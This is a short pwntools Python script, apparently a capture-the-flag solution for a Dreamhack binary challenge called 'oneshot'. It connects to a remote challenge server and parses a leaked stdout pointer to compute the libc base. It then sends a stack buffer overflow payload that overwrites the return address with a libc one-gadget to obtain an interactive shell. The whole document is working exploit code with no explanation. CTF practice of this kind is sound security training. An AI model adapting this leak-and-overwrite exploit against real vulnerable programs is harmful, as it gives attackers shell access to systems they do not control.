from pwn import *

# p = process('./oneshot')
p = remote('host3.dreamhack.games',14881)
e = ELF('./oneshot')
libc = ELF('./libc.so.6')

og = 0x45216

p.recvuntil('stdout: ')
stdout = int(p.recvline()[:-1], 16)
print(libc.symbols['_IO_2_1_stdout_'])
lib_base = stdout - libc.symbols['_IO_2_1_stdout_']
og = lib_base+og

payload = b'A'*0x18
payload += b'\x00'*0x8
payload += b'B'*0x8
payload += p64(og)

p.sendafter('MSG:', payload)
p.interactive()
